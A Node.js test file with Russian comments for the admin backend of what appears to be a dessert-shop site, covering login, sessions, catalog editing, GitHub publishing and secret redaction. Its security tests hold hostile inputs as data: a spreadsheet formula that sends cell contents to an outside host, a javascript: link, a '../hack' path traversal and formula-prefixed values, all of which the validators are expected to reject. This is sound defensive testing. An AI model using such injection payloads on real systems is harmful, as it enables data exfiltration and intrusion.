// Админка на сервере (Code.gs): вход по паролю и через Google, доступ, сессии,
// черновик каталога, фото, публикация в GitHub, даты/приём/заявки, отсутствие секретов в ответах.
process.env.TZ = 'Europe/Moscow';

import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { loadGas, parseOut, msk } from './helpers/gas.mjs';

const CLIENT_ID = 'test-client.apps.googleusercontent.com';
const GH_TOKEN = 'github_pat_TEST_SECRET_VALUE_1234567890';

function fresh({ props: extraProps, ...extra } = {}) {
  const google = extra.google || ((tok) => {
    // tok: «почта|aud|сдвиг срока в секундах|verified|nonce»
    const [email, aud = CLIENT_ID, ttl = '3600', verified = 'true', nonce = ''] = tok.split('|');
    return { code: 200, body: JSON.stringify({ email, aud, nonce, iss: 'https://accounts.google.com', email_verified: verified, exp: String(Math.floor(msk('2026-11-02', 10) / 1000) + Number(ttl)) }) };
  });
  const g = loadGas({
    nowMs: msk('2026-11-02', 10),
    ownerEmail: 'owner@gmail.com',
    ...extra,
    props: { TELEGRAM_BOT_TOKEN: 'TG', TELEGRAM_CHAT_ID: '-1', GOOGLE_CLIENT_ID: CLIENT_ID, GITHUB_TOKEN: GH_TOKEN, ADMIN_PASSWORD: 'Regalia-2026!', ...(extraProps || {}) },
    google,
  });
  g.ctx.setup();
  return g;
}
const call = (g, body) => parseOut(g.ctx.doPost({ postData: { contents: JSON.stringify(body) } }));
const login = (g, password = 'Regalia-2026!') => call(g, { action: 'admin.login', password });
// Вход через Google как в браузере: nonce из admin.config попадает в ID-токен.
function glogin(g, email, { aud = CLIENT_ID, ttl = 3600, verified = 'true', nonce } = {}) {
  const cfg = call(g, { action: 'admin.config' });
  const n = nonce === undefined ? cfg.nonce : nonce;
  return call(g, { action: 'admin.login', google: [email, aud, ttl, verified, n].join('|'), nonce: cfg.nonce });
}
// Настоящие «магические байты» WebP — сервер проверяет, что это картинка.
const WEBP = Buffer.concat([Buffer.from('RIFF'), Buffer.from([0x10, 0, 0, 0]), Buffer.from('WEBPVP8 fake-image-bytes')]).toString('base64');
const tgTexts = (g) => g.fetchCalls.filter((c) => c.url.includes('api.telegram.org')).map((c) => JSON.parse(c.options.payload).text);

test('setup(): листы админки созданы, черновик заполнен из опубликованного каталога', () => {
  const g = fresh();
  for (const n of ['Каталог', 'Начинки', 'Тексты', 'Доступ', '_Опубликовано']) assert.ok(g.ss.getSheetByName(n), n);
  assert.equal(g.ss.getSheetByName('Каталог').getLastRow(), 9); // заголовок + 8 десертов
  assert.equal(g.ss.getSheetByName('Начинки').getLastRow(), 7);
  assert.equal(g.props.OWNER_EMAIL, 'owner@gmail.com');
  const t = login(g);
  const c = call(g, { action: 'admin.catalog.get', token: t.token });
  assert.equal(c.ok, true);
  assert.equal(c.draft.desserts.length, 8);
  assert.deepEqual(c.changes, [], 'сразу после setup черновик = опубликованному');
  assert.deepEqual(c.problems, []);
  // повторный setup не дублирует
  g.ctx.setup();
  assert.equal(g.ss.getSheetByName('Каталог').getLastRow(), 9);
});

test('пароль: первичный ADMIN_PASSWORD превращается в хэш, открытого пароля больше нет', () => {
  const g = fresh();
  assert.equal(call(g, { action: 'admin.config' }).passwordEnabled, true);
  const r = login(g);
  assert.equal(r.ok, true);
  assert.match(r.token, /^[a-f0-9]{64}$/);
  assert.equal(r.method, 'password');
  assert.equal(g.props.ADMIN_PASSWORD, undefined, 'открытый пароль удалён');
  assert.match(g.props.ADMIN_PASSWORD_HASH, /^[a-f0-9]{64}$/);
  assert.ok(!Object.values(g.props).includes('Regalia-2026!'));
  assert.ok(tgTexts(g).some((t) => /Вход в админку/.test(t)));
});

test('пароль: неверный → отказ; 5 ошибок → блокировка 15 минут и уведомление', () => {
  const g = fresh();
  for (let i = 0; i < 5; i++) assert.equal(login(g, 'nope').code, 'login_failed');
  assert.equal(login(g).code, 'locked', 'даже верный пароль во время блокировки');
  assert.ok(tgTexts(g).some((t) => /5 неудачных попыток/.test(t)));
  g.cache.delete('admin_fails'); // прошло 15 минут
  assert.equal(login(g).ok, true);
});

test('сессия: без токена и с чужим токеном — отказ; через 12 часов истекает; «выйти всех» завершает', () => {
  const g = fresh();
  assert.equal(call(g, { action: 'admin.catalog.get' }).code, 'unauthorized');
  assert.equal(call(g, { action: 'admin.catalog.get', token: 'a'.repeat(64) }).code, 'unauthorized');
  const t = login(g).token;
  assert.equal(call(g, { action: 'admin.me', token: t }).ok, true);
  g.setNow(msk('2026-11-02', 21, 59));
  assert.equal(call(g, { action: 'admin.me', token: t }).ok, true);
  g.setNow(msk('2026-11-02', 22, 1));
  assert.equal(call(g, { action: 'admin.me', token: t }).code, 'unauthorized');
  g.setNow(msk('2026-11-02', 23));
  const t2 = login(g).token;
  assert.equal(call(g, { action: 'admin.sessions.revoke', token: t2 }).ok, true);
  assert.equal(call(g, { action: 'admin.me', token: t2 }).code, 'unauthorized');
});

test('Google: владелец входит всегда; чужая почта — нет, пока её не добавят на лист «Доступ»', () => {
  const g = fresh();
  assert.equal(call(g, { action: 'admin.config' }).googleEnabled, true);
  const owner = glogin(g, 'owner@gmail.com');
  assert.equal(owner.ok, true);
  assert.equal(owner.email, 'owner@gmail.com');
  assert.equal(glogin(g, 'olga@gmail.com').code, 'forbidden');
  call(g, { action: 'admin.access.save', token: owner.token, email: 'Olga@Gmail.com', name: 'Ольга' });
  const olga = glogin(g, 'olga@gmail.com');
  assert.equal(olga.ok, true);
  assert.ok(g.ss.getSheetByName('Доступ').getRange(2, 4).getValue(), 'записан «Последний вход»');
  // выключили доступ — сессия Ольги перестаёт работать сразу
  call(g, { action: 'admin.access.save', token: owner.token, email: 'olga@gmail.com', name: 'Ольга', enabled: false });
  assert.equal(call(g, { action: 'admin.me', token: olga.token }).code, 'unauthorized');
  // удалили строку
  const list = call(g, { action: 'admin.access.delete', token: owner.token, email: 'olga@gmail.com' });
  assert.equal(list.people.length, 0);
  assert.ok(tgTexts(g).some((t) => /добавлен доступ: olga@gmail\.com/.test(t)));
});

test('Google: токен для другого сайта, просроченный, с неподтверждённой почтой — отказ', () => {
  const g = fresh();
  assert.equal(glogin(g, 'owner@gmail.com', { aud: 'other.apps.googleusercontent.com' }).code, 'login_failed');
  assert.equal(glogin(g, 'owner@gmail.com', { ttl: -10 }).code, 'login_failed');
  assert.equal(glogin(g, 'owner@gmail.com', { verified: 'false' }).code, 'login_failed');
  assert.equal(glogin(g, 'owner@gmail.com', { nonce: 'f'.repeat(32) }).code, 'login_failed', 'чужой nonce в токене');
  // nonce одноразовый: повтор того же токена не проходит
  const cfg = call(g, { action: 'admin.config' });
  const tok = ['owner@gmail.com', CLIENT_ID, 3600, 'true', cfg.nonce].join('|');
  assert.equal(call(g, { action: 'admin.login', google: tok, nonce: cfg.nonce }).ok, true);
  assert.equal(call(g, { action: 'admin.login', google: tok, nonce: cfg.nonce }).code, 'login_failed', 'повтор токена');
  // неудачи Google не блокируют вход по паролю
  for (let i = 0; i < 8; i++) glogin(g, 'owner@gmail.com', { aud: 'x' });
  assert.equal(login(g).ok, true);
  const g2 = fresh({ props: { GOOGLE_CLIENT_ID: '' } });
  assert.equal(call(g2, { action: 'admin.config' }).googleEnabled, false);
  for (let i = 0; i < 8; i++) assert.equal(call(g2, { action: 'admin.login', google: 'x' }).code, 'google_disabled');
  assert.equal(login(g2).ok, true, 'вход по паролю не заблокирован чужими Google-попытками');
  assert.ok(!g2.fetchCalls.some((c) => c.url.includes('tokeninfo')), 'без GOOGLE_CLIENT_ID запросов к Google нет');
});

test('смена пароля: простой отклоняется; после смены старые парольные сессии закрыты', () => {
  const g = fresh();
  const t = login(g).token;
  assert.equal(call(g, { action: 'admin.password.set', token: t, password: '123' }).code, 'validation');
  assert.equal(call(g, { action: 'admin.password.set', token: t, password: 'aaaaaaaaaa' }).code, 'validation');
  assert.equal(call(g, { action: 'admin.password.set', token: t, password: 'Новый-пароль-77' }).ok, true);
  assert.equal(call(g, { action: 'admin.me', token: t }).code, 'unauthorized');
  assert.equal(login(g).code, 'login_failed');
  assert.equal(login(g, 'Новый-пароль-77').ok, true);
});

test('каталог: правка, ошибки полей, новый скрытый десерт, порядок, начинки, тексты', () => {
  const g = fresh();
  const t = login(g).token;
  const get = () => call(g, { action: 'admin.catalog.get', token: t });
  const bento = get().draft.desserts[0];
  // ошибка: цена «до» меньше «от»
  const bad = call(g, { action: 'admin.dessert.save', token: t, originalId: 'bento', dessert: { ...bento, priceMin: 3000, priceMax: 2000 } });
  assert.equal(bad.code, 'validation');
  assert.ok(bad.errors.priceMax);
  // правка цены
  let c = call(g, { action: 'admin.dessert.save', token: t, originalId: 'bento', dessert: { ...bento, priceMin: 2000, priceMax: 2500 } });
  assert.equal(c.ok, true);
  assert.deepEqual(c.changes, ['«Бенто-торт «Пудра»»']);
  // новый видимый без фото — нельзя; скрытый — можно, код из названия
  assert.ok(call(g, { action: 'admin.dessert.save', token: t, dessert: { name: 'Медовик', fillings: ['Медовый крем'], priceMin: 3000, priceMax: 4000, unit: '1 кг', leadDays: 2 } }).errors.image);
  c = call(g, { action: 'admin.dessert.save', token: t, dessert: { name: 'Медовик', visible: false, fillings: 'Медовый крем; Сметанный крем', priceMin: 3000, priceMax: 4000, unit: '1 кг', leadDays: 2 } });
  assert.equal(c.ok, true);
  const med = c.draft.desserts.find((d) => d.id === 'medovik');
  assert.ok(med, 'код «medovik» из названия');
  assert.deepEqual(Array.from(med.fillings), ['Медовый крем', 'Сметанный крем']);
  // порядок
  const ids = c.draft.desserts.map((d) => d.id).reverse();
  c = call(g, { action: 'admin.reorder', token: t, ids });
  assert.equal(c.draft.desserts[0].id, 'medovik');
  assert.equal(call(g, { action: 'admin.reorder', token: t, ids: ids.slice(1) }).code, 'validation');
  // начинки и тексты
  c = call(g, { action: 'admin.fillings.save', token: t, items: [...c.draft.fillings, { name: 'Медовый крем', description: 'Сметанный крем с гречишным мёдом.' }] });
  assert.ok(c.changes.includes('начинки'));
  assert.equal(call(g, { action: 'admin.texts.save', token: t, texts: { 'links.instagram': 'javascript:alert(1)' } }).code, 'validation');
  c = call(g, { action: 'admin.texts.save', token: t, texts: { 'hero.titleLines': 'Торты\nк празднику', 'contacts.phone': '8 999 111-22-33' } });
  assert.equal(c.ok, true);
  assert.equal(c.draft.texts['hero.titleLines'], 'Торты\nк празднику');
  // удаление
  c = call(g, { action: 'admin.dessert.delete', token: t, id: 'medovik' });
  assert.ok(!c.draft.desserts.some((d) => d.id === 'medovik'));
});

test('публикация: фото из черновика + каталог одним коммитом в GitHub; заявки идут по новому каталогу', () => {
  const g = fresh();
  const t = login(g).token;
  assert.equal(call(g, { action: 'admin.publish', token: t }).code, 'nothing');
  // новый десерт с фото
  call(g, { action: 'admin.dessert.save', token: t, dessert: { name: 'Медовик', visible: false, fillings: ['Медовый крем'], priceMin: 3000, priceMax: 4000, unit: '1 кг', leadDays: 2 } });
  const up = call(g, { action: 'admin.photo.upload', token: t, dessertId: 'medovik', w480: WEBP, w900: WEBP });
  assert.match(up.ref, /^drive:/);
  let c = call(g, { action: 'admin.catalog.get', token: t });
  const med = c.draft.desserts.find((d) => d.id === 'medovik');
  assert.equal(med.image, up.ref);
  call(g, { action: 'admin.dessert.save', token: t, originalId: 'medovik', dessert: { ...med, visible: true, image: '' } });
  // скрываем свадебный
  const wed = c.draft.desserts.find((d) => d.id === 'wedding');
  call(g, { action: 'admin.dessert.save', token: t, originalId: 'wedding', dessert: { ...wed, visible: false } });

  const r = call(g, { action: 'admin.publish', token: t });
  assert.equal(r.ok, true, r.message);
  assert.equal(r.version, 2);
  const files = g.github.lastFiles();
  const paths = Object.keys(files).sort();
  assert.ok(paths.includes('data/catalog.json') && paths.includes('data/catalog.js'));
  const imgs = paths.filter((p) => p.startsWith('images/catalog/medovik-'));
  assert.equal(imgs.length, 2);
  assert.equal(files[imgs[0]].encoding, 'base64');
  const published = JSON.parse(files['data/catalog.json'].content);
  assert.equal(published.publishedBy, 'админка', 'почта админа не попадает в публичный каталог');
  assert.doesNotMatch(g.github.calls.find((x) => x.path === '/git/commits' && x.method === 'post').body.message, /@|пароль/);
  assert.ok(g.drive.files.every((f) => f.trashed), 'черновики фото после публикации удалены');
  const pm = published.desserts.find((d) => d.id === 'medovik');
  assert.match(pm.image, /^images\/catalog\/medovik-\d+$/);
  assert.equal(files['data/catalog.js'].content, g.get('catalogToJsModule')(published));
  // токен — только в заголовке, не в теле
  assert.ok(g.github.calls.every((x) => x.auth === 'Bearer ' + GH_TOKEN));
  assert.ok(!JSON.stringify(g.github.calls.map((x) => x.body)).includes(GH_TOKEN));
  // после публикации изменений нет, фото в черновике — путь на сайте
  c = call(g, { action: 'admin.catalog.get', token: t });
  assert.deepEqual(c.changes, []);
  assert.equal(c.draft.desserts.find((d) => d.id === 'medovik').image, pm.image);
  assert.ok(tgTexts(g).some((x) => /Каталог опубликован/.test(x)));
  // заявки: медовик можно, свадебный (скрыт) — нельзя
  const order = (dessertId, filling) => parseOut(g.ctx.doPost({ postData: { contents: JSON.stringify({ dessertId, filling, date: '2026-11-25', pickup: 'pickup', name: 'Анна', contact: '@anna_test', consent: true }) } }));
  assert.equal(order('medovik', 'Медовый крем').ok, true);
  assert.ok(order('wedding', 'Красный бархат').errors.dessertId);
});

test('публикация: ошибка GitHub не теряет черновик, токен не попадает в ответ и журнал', () => {
  const g = fresh({ githubFails: true });
  const t = login(g).token;
  const b = call(g, { action: 'admin.catalog.get', token: t }).draft.desserts[0];
  call(g, { action: 'admin.dessert.save', token: t, originalId: 'bento', dessert: { ...b, priceMax: 2600 } });
  const r = call(g, { action: 'admin.publish', token: t });
  assert.equal(r.code, 'publish_failed');
  assert.match(r.message, /401/);
  assert.doesNotMatch(JSON.stringify(r), new RegExp(GH_TOKEN));
  const log = g.ss.getSheetByName('Журнал');
  for (let i = 2; i <= log.getLastRow(); i++) assert.doesNotMatch(String(log.getRange(i, 4).getValue()), new RegExp(GH_TOKEN));
  assert.equal(call(g, { action: 'admin.catalog.get', token: t }).changes.length, 1, 'черновик на месте');
});

test('публикация без GITHUB_TOKEN — понятное сообщение', () => {
  const g = fresh({ props: { GITHUB_TOKEN: '' } });
  const t = login(g).token;
  const b = call(g, { action: 'admin.catalog.get', token: t }).draft.desserts[0];
  call(g, { action: 'admin.dessert.save', token: t, originalId: 'bento', dessert: { ...b, priceMax: 2600 } });
  assert.match(call(g, { action: 'admin.publish', token: t }).message, /GITHUB_TOKEN/);
});

test('даты, приём заявок, заявки', () => {
  const g = fresh();
  const t = login(g).token;
  let d = call(g, { action: 'admin.days.get', token: t });
  assert.equal(d.dates.length, 45);
  d = call(g, { action: 'admin.day.set', token: t, date: '2026-11-10', limit: 0, closed: false });
  assert.equal(d.dates.find((x) => x.date === '2026-11-10').status, 'closed');
  assert.equal(call(g, { action: 'admin.day.set', token: t, date: '2026-11-10', limit: -1 }).code, 'validation');
  const s = call(g, { action: 'admin.settings.set', token: t, settings: { acceptingOrders: false, pauseNote: 'Отпуск до 20 ноября' } });
  assert.equal(s.settings.acceptingOrders, false);
  const av = parseOut(g.ctx.doGet({ parameter: { action: 'availability' } }));
  assert.equal(av.acceptingOrders, false);
  assert.equal(av.pauseNote, 'Отпуск до 20 ноября');
  call(g, { action: 'admin.settings.set', token: t, settings: { acceptingOrders: true } });
  parseOut(g.ctx.doPost({ postData: { contents: JSON.stringify({ dessertId: 'bento', filling: 'Ваниль-клубника', date: '2026-11-12', pickup: 'pickup', name: 'Анна', contact: '+7 900 123-45-67', consent: true }) } }));
  const list = call(g, { action: 'admin.orders.list', token: t });
  assert.equal(list.orders[0].number, 'A-0001');
  assert.equal(list.orders[0].contact, '+7 900 123-45-67');
  assert.equal(call(g, { action: 'admin.order.setStatus', token: t, number: 'A-0001', status: 'Удалить всё' }).code, 'validation');
  assert.equal(call(g, { action: 'admin.order.setStatus', token: t, number: 'A-0001', status: 'Отменена' }).ok, true);
  assert.equal(g.ss.getSheetByName('Заявки').getRange(2, 3).getValue(), 'Отменена');
});

test('в ответах админки нет секретов (хэш пароля, соль, токены)', () => {
  const g = fresh();
  const t = login(g).token;
  const all = ['admin.me', 'admin.catalog.get', 'admin.access.list', 'admin.settings.get', 'admin.days.get', 'admin.orders.list']
    .map((action) => JSON.stringify(call(g, { action, token: t }))).join('\n') + JSON.stringify(call(g, { action: 'admin.config' }));
  for (const secret of [g.props.ADMIN_PASSWORD_HASH, g.props.ADMIN_PASSWORD_SALT, GH_TOKEN, 'TG']) {
    assert.ok(!all.includes(secret), 'утёк секрет');
  }
});

test('черновик фото: превью доступно только после входа', () => {
  const g = fresh();
  const t = login(g).token;
  call(g, { action: 'admin.dessert.save', token: t, dessert: { name: 'Медовик', visible: false, fillings: ['Медовый крем'], priceMin: 3000, priceMax: 4000, unit: '1 кг', leadDays: 2 } });
  const up = call(g, { action: 'admin.photo.upload', token: t, dessertId: 'medovik', w480: WEBP, w900: WEBP });
  assert.equal(call(g, { action: 'admin.photo.preview', ref: up.ref }).code, 'unauthorized');
  assert.match(call(g, { action: 'admin.photo.preview', token: t, ref: up.ref }).dataUrl, /^data:image\/webp;base64,UklGR/);
  assert.equal(call(g, { action: 'admin.photo.upload', token: t, dessertId: '../hack', w480: WEBP, w900: WEBP }).code, 'validation');
  assert.equal(call(g, { action: 'admin.photo.upload', token: t, dessertId: 'medovik', w480: 'QUJD', w900: 'QUJD' }).code, 'validation', 'не картинка');
});

test('чужой файл с Диска нельзя ни посмотреть, ни поставить в карточку, ни опубликовать', () => {
  const g = fresh();
  const t = login(g).token;
  // «чужой» файл владельца, не загруженный через админку
  g.drive.files.push({ id: 'secret-doc', blob: { bytes: Array.from(Buffer.from('СЕКРЕТНЫЙ ДОКУМЕНТ')) } });
  const ref = 'drive:secret-doc|secret-doc|webp';
  assert.equal(call(g, { action: 'admin.photo.preview', token: t, ref }).code, 'validation');
  const b = call(g, { action: 'admin.catalog.get', token: t }).draft.desserts[0];
  const r = call(g, { action: 'admin.dessert.save', token: t, originalId: 'bento', dessert: { ...b, image: ref } });
  assert.equal(r.code, 'validation');
  assert.ok(r.errors.image);
});

test('почта в «Доступ»: формула не проходит; журнал защищён от формул', () => {
  const g = fresh();
  const t = login(g).token;
  assert.equal(call(g, { action: 'admin.access.save', token: t, email: '=IMPORTDATA("https://e.tld/?"&B1)&"@x.yz"' }).code, 'validation');
  call(g, { action: 'admin.login', password: '=HYPERLINK("x")' });
  const log = g.ss.getSheetByName('Журнал');
  for (let i = 2; i <= log.getLastRow(); i++) for (let c = 1; c <= 4; c++) assert.doesNotMatch(String(log.data[i - 1][c - 1] ?? ''), /^=/);
});

test('слабый первичный ADMIN_PASSWORD не принимается; секреты вычищаются из текстов ошибок', () => {
  const g = fresh({ props: { ADMIN_PASSWORD: '12345678' } });
  const r = login(g, '12345678');
  assert.equal(r.code, 'weak_password');
  assert.equal(g.props.ADMIN_PASSWORD_HASH, undefined);
  const scrub = g.get('scrubSecrets_');
  assert.equal(scrub('https://api.telegram.org/bot123456789:AAbbCCddEEffGGhhIIjjKKllMMnnOOppQQrr/sendMessage'), 'https://api.telegram.org/bot***/sendMessage');
  assert.equal(scrub('Bearer github_pat_ABCdef123_XYZ'), 'Bearer github_pat_***');
});

test('публикация не держит общий замок во время запросов к GitHub (заявки не получают «занято»)', () => {
  const g = fresh();
  const t = login(g).token;
  const b = call(g, { action: 'admin.catalog.get', token: t }).draft.desserts[0];
  call(g, { action: 'admin.dessert.save', token: t, originalId: b.id, dessert: { ...b, priceMax: b.priceMax + 100 } });
  const before = g.fetchCalls.length;
  assert.equal(call(g, { action: 'admin.publish', token: t }).ok, true);
  const gh = g.fetchCalls.slice(before).filter((c) => c.url.startsWith('https://api.github.com/'));
  assert.ok(gh.length >= 5);
  assert.ok(gh.every((c) => !c.locked), 'запросы к GitHub идут без замка');
  assert.equal(g.cache.get('publishing'), undefined, 'флаг публикации снят');
});

test('публикация: база — каталог из репозитория (поля, добавленные разработчиком, не затираются); двойной клик отклоняется', () => {
  const repo = JSON.parse(JSON.stringify(require_catalog()));
  repo.version = 7;
  repo.newField = { keep: 'да' };
  const g = fresh({ repoCatalog: repo });
  const t = login(g).token;
  const b = call(g, { action: 'admin.catalog.get', token: t }).draft.desserts[0];
  call(g, { action: 'admin.dessert.save', token: t, originalId: b.id, dessert: { ...b, priceMax: b.priceMax + 100 } });
  g.cache.set('publishing', '1');
  assert.equal(call(g, { action: 'admin.publish', token: t }).code, 'busy');
  g.cache.delete('publishing');
  const r = call(g, { action: 'admin.publish', token: t });
  assert.equal(r.ok, true, r.message);
  assert.equal(r.version, 8, 'версия продолжает репозиторий');
  const pub = JSON.parse(g.github.lastFiles()['data/catalog.json'].content);
  assert.deepEqual(pub.newField, { keep: 'да' });
});

test('admin.config: версия сервера и что не настроено (без значений)', () => {
  const g = fresh({ props: { GITHUB_TOKEN: '' } });
  const c = call(g, { action: 'admin.config' });
  assert.equal(c.serverVersion, g.get('SERVER_VERSION'));
  assert.deepEqual(c.setupProblems, ['GITHUB_TOKEN']);
  delete g.props.GITHUB_REPO;
  assert.deepEqual(call(g, { action: 'admin.config' }).setupProblems, ['GITHUB_REPO', 'GITHUB_TOKEN']);
  const t = login(g).token;
  const r = call(g, { action: 'admin.publish', token: t });
  assert.equal(r.ok, false);
});

function require_catalog() {
  return JSON.parse(fs.readFileSync(new URL('./fixtures/catalog.json', import.meta.url), 'utf8'));
}
